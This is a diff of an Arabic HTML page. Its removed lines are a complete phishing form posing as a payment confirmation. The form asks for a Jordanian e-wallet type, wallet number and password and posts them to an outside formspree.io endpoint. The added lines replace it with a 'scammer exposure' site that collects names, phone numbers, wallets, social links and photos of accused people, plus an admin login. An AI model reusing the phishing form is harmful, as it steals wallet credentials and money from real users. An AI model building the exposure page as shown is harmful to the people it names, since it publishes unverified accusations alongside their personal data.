@@ -2,40 +2,58 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الدفع</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
-        .login-container { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 320px; }
-        h2 { color: #004a99; text-align: center; }
-        p { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
-        input, select { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #004a99; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        button:hover { background-color: #003366; }
-    </style>
+    <title>موقع كشف النصابين</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <header>
+        <h1>🔍 موقع كشف</h1>
+        <p>موقع مخصص لكشف الاحتيال. إذا تعرضت للنصب، اكتب التفاصيل ليحذر الآخرون.</p>
+    </header>
 
-<div class="login-container">
-    <h2>تأكيد الدفع</h2>
-    <p>يرجى تسجيل الدخول باستخدام محفظتك الإلكترونية (زين كاش، أمنية يو ولت، أو أورانج موني) لإتمام عملية الدفع.</p>
-    
-    <!-- هذا هو الرابط الصحيح الخاص بك -->
-    <form action="https://formspree.io/f/meeyerjy" method="POST">
-        
-        <select name="wallet_type" required>
-            <option value="" disabled selected>اختر نوع المحفظة</option>
-            <option value="ZainCash">زين كاش</option>
-            <option value="Umniah">أمنية يو ولت</option>
-            <option value="OrangeMoney">أورانج موني</option>
-        </select>
+    <div class="container">
+        <!-- البحث -->
+        <div class="box">
+            <h3>البحث عن نصاب</h3>
+            <input type="text" id="searchPhone" placeholder="أدخل رقم الهاتف للبحث">
+            <button onclick="searchData()" style="background:#28a745;">بحث الآن</button>
+            <div id="result" style="margin-top:20px;"></div>
+        </div>
 
-        <input type="text" name="wallet_number" placeholder="رقم المحفظة" required>
-        <input type="password" name="password" placeholder="كلمة السر" required>
-        
-        <button type="submit">إتمام الدفع</button>
-    </form>
-</div>
+        <!-- عرض البلاغات -->
+        <button onclick="showReports()" style="background:#ffc107; color:#000; width:90%; max-width:400px; padding:15px; border-radius:10px; font-weight:bold; cursor:pointer; margin-top:10px;">عرض جميع البلاغات</button>
+        <div id="reports-list" style="display:none;" class="box">
+            <h3>قائمة البلاغات</h3>
+            <div id="all-reports"></div>
+            <button onclick="document.getElementById('reports-list').style.display='none'">إغلاق</button>
+        </div>
 
+        <!-- الإضافة -->
+        <div class="box">
+            <h3>أضف بلاغ جديد</h3>
+            <input type="text" id="name" placeholder="اسم الشخص">
+            <input type="text" id="phone" placeholder="رقم الهاتف">
+            <input type="text" id="wallet" placeholder="المحفظة أو الكلك (مثال: زين كاش)">
+            <input type="text" id="socialLink" placeholder="رابط الحساب (فيسبوك/واتس)">
+            <label>صورة الحساب:</label>
+            <input type="file" id="personImg" accept="image/*">
+            <textarea id="notes" placeholder="كيف نصب عليك؟ اكتب التفاصيل..."></textarea>
+            <button onclick="saveData()">حفظ البلاغ</button>
+        </div>
+
+        <!-- قسم الأدمن -->
+        <div class="box" style="margin-top: 50px;">
+            <h3>لوحة التحكم (للأدمن)</h3>
+            <input type="text" id="adminUser" placeholder="اسم المستخدم">
+            <input type="password" id="adminPass" placeholder="كلمة السر">
+            <button onclick="checkAdmin()" style="background:#dc3545;">دخول الأدمن</button>
+        </div>
+    </div>
+
+    <footer style="margin-top: 30px; color: #666; font-size: 0.8em; text-align: center; padding-bottom: 20px;">
+        <p>تم التصميم بواسطة بنات الاردن بزنس ©</p>
+    </footer>
+
+    <script src="script.js"></script>
 </body>
 </html>
